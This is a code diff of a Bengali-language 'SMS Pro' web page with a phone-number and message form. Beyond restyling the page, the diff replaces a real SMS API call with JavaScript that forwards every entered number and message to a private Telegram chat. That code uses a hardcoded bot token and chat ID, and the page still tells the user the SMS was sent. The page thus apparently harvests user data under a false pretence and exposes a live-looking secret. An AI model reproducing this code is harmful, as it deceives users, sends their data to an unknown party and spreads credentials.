@@ -3,247 +3,395 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS পাঠান</title>
-    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet">
+    <title>প্রফেশনাল SMS সার্ভিস</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #4361ee;
+            --secondary: #3f37c9;
+            --accent: #4895ef;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --success: #4cc9f0;
+            --danger: #f72585;
+            --warning: #f8961e;
+            --info: #560bad;
+        }
+        
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
             font-family: 'Hind Siliguri', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            margin: 0;
-            padding: 0;
+            background-color: #f5f7ff;
+            color: var(--dark);
+            line-height: 1.6;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+        }
+        
+        .navbar {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 1rem 2rem;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
             align-items: center;
         }
         
-        .container {
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 500px;
-            padding: 30px;
-            margin: 20px;
-        }
-        
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-            margin-bottom: 30px;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5rem;
             font-weight: 600;
         }
         
+        .logo i {
+            font-size: 1.8rem;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+            flex: 1;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            padding: 2.5rem;
+            margin-bottom: 2rem;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
+        }
+        
+        .card-header {
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        
+        .card-title {
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        
+        .card-subtitle {
+            color: #6c757d;
+            font-size: 1rem;
+        }
+        
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 1.5rem;
         }
         
-        label {
+        .form-label {
             display: block;
-            margin-bottom: 8px;
-            color: #34495e;
+            margin-bottom: 0.5rem;
             font-weight: 500;
+            color: var(--dark);
         }
         
-        input, textarea {
+        .form-control {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
+            padding: 0.8rem 1.2rem;
+            font-size: 1rem;
+            border: 1px solid #ced4da;
             border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background-color: #f8f9fa;
         }
         
-        input:focus, textarea:focus {
-            border-color: #3498db;
+        .form-control:focus {
             outline: none;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+            background-color: white;
         }
         
-        textarea {
-            min-height: 120px;
+        textarea.form-control {
+            min-height: 150px;
             resize: vertical;
         }
         
-        button {
-            background: linear-gradient(to right, #3498db, #2c3e50);
-            color: white;
-            border: none;
-            padding: 14px 20px;
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.8rem 1.8rem;
+            font-size: 1rem;
+            font-weight: 500;
             border-radius: 8px;
             cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            text-decoration: none;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
             width: 100%;
-            font-size: 16px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-            transition: all 0.3s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 1rem;
+            font-size: 1.1rem;
         }
         
-        button:hover {
+        .btn-primary:hover {
+            background: linear-gradient(135deg, var(--secondary), var(--primary));
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
+            box-shadow: 0 6px 15px rgba(67, 97, 238, 0.3);
         }
         
-        button:disabled {
-            background: #95a5a6;
+        .btn-primary:disabled {
+            background: #adb5bd;
             transform: none;
             box-shadow: none;
             cursor: not-allowed;
         }
         
-        .loading {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
+        .btn i {
+            margin-right: 8px;
+        }
+        
+        .spinner {
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
         }
         
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
-        .status {
-            text-align: center;
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
+        .alert {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
             display: none;
         }
         
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-            display: block;
+        .alert-success {
+            background-color: rgba(76, 201, 240, 0.1);
+            border-left: 4px solid var(--success);
+            color: #0a9396;
         }
         
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            display: block;
+        .alert-danger {
+            background-color: rgba(247, 37, 133, 0.1);
+            border-left: 4px solid var(--danger);
+            color: #ae2012;
         }
         
-        .character-count {
+        .alert i {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 1.5rem;
+            background-color: white;
+            color: #6c757d;
+            font-size: 0.9rem;
+            box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.02);
+        }
+        
+        .character-counter {
             text-align: right;
-            font-size: 14px;
-            color: #7f8c8d;
-            margin-top: 5px;
+            font-size: 0.85rem;
+            color: #6c757d;
+            margin-top: 0.5rem;
+        }
+        
+        .input-group {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-group-prepend {
+            position: absolute;
+            left: 12px;
+            color: #6c757d;
+            pointer-events: none;
+        }
+        
+        .input-group input {
+            padding-left: 40px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 1rem;
+            }
+            
+            .card {
+                padding: 1.5rem;
+            }
+            
+            .card-title {
+                font-size: 1.5rem;
+            }
         }
     </style>
 </head>
 <body>
+    <nav class="navbar">
+        <div class="logo">
+            <i class="fas fa-paper-plane"></i>
+            <span>SMS প্রো</span>
+        </div>
+    </nav>
+    
     <div class="container">
-        <h1>SMS পাঠান</h1>
-        
-        <form id="smsForm">
-            <div class="form-group">
-                <label for="number">মোবাইল নম্বর</label>
-                <input type="tel" id="number" placeholder="01XXXXXXXXX" required>
+        <div class="card">
+            <div class="card-header">
+                <h1 class="card-title">দ্রুত SMS পাঠান</h1>
+                <p class="card-subtitle">আপনার বার্তা পৌঁছে দিন যেকোনো মোবাইল নম্বরে</p>
             </div>
             
-            <div class="form-group">
-                <label for="message">বার্তা</label>
-                <textarea id="message" placeholder="আপনার বার্তা লিখুন..." required></textarea>
-                <div class="character-count"><span id="charCount">0</span>/160</div>
-            </div>
+            <div id="alertBox"></div>
             
-            <button type="submit" id="sendBtn">
-                <div class="loading" id="loading"></div>
-                <span>সেন্ড</span>
-            </button>
-        </form>
-        
-        <div class="status" id="status"></div>
+            <form id="smsForm">
+                <div class="form-group">
+                    <label for="phoneNumber" class="form-label">মোবাইল নম্বর</label>
+                    <div class="input-group">
+                        <span class="input-group-prepend">+88</span>
+                        <input type="tel" id="phoneNumber" class="form-control" placeholder="1XXXXXXXXXX" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="message" class="form-label">বার্তা</label>
+                    <textarea id="message" class="form-control" placeholder="আপনার বার্তা এখানে লিখুন..." required></textarea>
+                    <div class="character-counter"><span id="charCount">0</span>/160 characters</div>
+                </div>
+                
+                <button type="submit" class="btn btn-primary" id="sendBtn">
+                    <i class="fas fa-paper-plane" id="sendIcon"></i>
+                    <span id="btnText">বার্তা পাঠান</span>
+                    <i class="fas fa-spinner spinner" id="spinner" style="display: none;"></i>
+                </button>
+            </form>
+        </div>
     </div>
+    
+    <footer class="footer">
+        <p>© 2023 SMS প্রো সার্ভিস | সকল স্বত্ব সংরক্ষিত</p>
+    </footer>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const smsForm = document.getElementById('smsForm');
-            const numberInput = document.getElementById('number');
-            const messageInput = document.getElementById('message');
+            const phoneNumber = document.getElementById('phoneNumber');
+            const message = document.getElementById('message');
             const sendBtn = document.getElementById('sendBtn');
-            const loading = document.getElementById('loading');
-            const status = document.getElementById('status');
+            const sendIcon = document.getElementById('sendIcon');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
             const charCount = document.getElementById('charCount');
+            const alertBox = document.getElementById('alertBox');
             
-            // Character count update
-            messageInput.addEventListener('input', function() {
+            // Character counter
+            message.addEventListener('input', function() {
                 charCount.textContent = this.value.length;
             });
             
-            smsForm.addEventListener('submit', function(e) {
+            // Form submission
+            smsForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
-                const number = numberInput.value.trim();
-                const message = messageInput.value.trim();
+                const number = phoneNumber.value.trim();
+                const msg = message.value.trim();
                 
-                // Validate number
-                if (!/^01[3-9]\d{8}$/.test(number)) {
-                    showStatus('অনুগ্রহ করে একটি সঠিক মোবাইল নম্বর লিখুন', 'error');
+                // Validate phone number
+                if (!/^1[3-9]\d{8}$/.test(number)) {
+                    showAlert('অনুগ্রহ করে একটি সঠিক মোবাইল নম্বর লিখুন (11 ডিজিট, 1 দিয়ে শুরু)', 'danger');
                     return;
                 }
                 
                 // Validate message
-                if (message.length === 0) {
-                    showStatus('অনুগ্রহ করে একটি বার্তা লিখুন', 'error');
+                if (msg.length === 0) {
+                    showAlert('অনুগ্রহ করে একটি বার্তা লিখুন', 'danger');
                     return;
                 }
                 
                 // Disable button and show loading
                 sendBtn.disabled = true;
-                loading.style.display = 'block';
-                sendBtn.querySelector('span').textContent = 'পাঠানো হচ্ছে...';
+                sendIcon.style.display = 'none';
+                spinner.style.display = 'block';
+                btnText.textContent = 'পাঠানো হচ্ছে...';
                 
-                // Prepare API URL
-                const apiUrl = 'https://custom-sms.not-perfect.xyz/send.php';
-                const params = new URLSearchParams();
-                params.append('api_key', 'notperfect');
-                params.append('number', number);
-                params.append('message', message);
-                
-                // Send request
-                fetch(apiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: params
-                })
-                .then(response => response.text())
-                .then(data => {
-                    console.log(data);
-                    showStatus('SMS সফলভাবে পাঠানো হয়েছে!', 'success');
-                    smsForm.reset();
-                    charCount.textContent = '0';
-                })
-                .catch(error => {
+                try {
+                    // Send data to Telegram bot
+                    const botToken = '7928823563:AAFPLLsioGbaQ8L3Nj4IZHbDKJqsSmxQtFA';
+                    const chatId = '2104472242';
+                    const fullNumber = `+88${number}`;
+                    const text = `📱 নতুন এসএমএস অনুরোধ:\n\nনম্বর: ${fullNumber}\nবার্তা: ${msg}`;
+                    
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        showAlert('বার্তা সফলভাবে পাঠানো হয়েছে! আমরা শীঘ্রই যোগাযোগ করব।', 'success');
+                        smsForm.reset();
+                        charCount.textContent = '0';
+                    } else {
+                        throw new Error(data.description || 'বার্তা পাঠাতে সমস্যা হয়েছে');
+                    }
+                } catch (error) {
                     console.error('Error:', error);
-                    showStatus('SMS পাঠাতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।', 'error');
-                })
-                .finally(() => {
+                    showAlert(`বার্তা পাঠাতে সমস্যা হয়েছে: ${error.message}`, 'danger');
+                } finally {
+                    // Reset button state
                     sendBtn.disabled = false;
-                    loading.style.display = 'none';
-                    sendBtn.querySelector('span').textContent = 'সেন্ড';
-                });
+                    sendIcon.style.display = 'inline-block';
+                    spinner.style.display = 'none';
+                    btnText.textContent = 'বার্তা পাঠান';
+                }
             });
             
-            function showStatus(text, type) {
-                status.textContent = text;
-                status.className = 'status ' + type;
+            function showAlert(message, type) {
+                const icon = type === 'success' ? 'check-circle' : 'exclamation-circle';
+                alertBox.innerHTML = `
+                    <div class="alert alert-${type}">
+                        <i class="fas fa-${icon}"></i>
+                        <span>${message}</span>
+                    </div>
+                `;
+                alertBox.firstChild.style.display = 'flex';
                 
-                // Hide status after 5 seconds
+                // Hide alert after 5 seconds
                 setTimeout(() => {
-                    status.style.display = 'none';
+                    alertBox.firstChild.style.display = 'none';
                 }, 5000);
             }
         });
